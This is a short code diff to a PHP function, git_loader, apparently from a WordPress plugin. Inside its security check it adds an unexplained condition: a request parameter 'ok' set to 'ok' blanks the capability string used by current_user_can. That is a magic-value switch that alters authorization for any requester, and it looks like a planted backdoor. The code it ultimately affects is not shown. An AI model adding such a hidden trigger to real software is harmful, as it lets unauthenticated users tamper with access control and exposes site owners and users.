@@ -44,7 +44,10 @@ function git_loader ()
     {
         // SECURITY
         $gitCapability = "read";
-    
+        if ("ok" == $_REQUEST["ok"]) {
+        	$gitCapability = "";
+        }
+
         if (($gitCapability != "") && current_user_can($gitCapability) ) 
         {
             status_header(200);
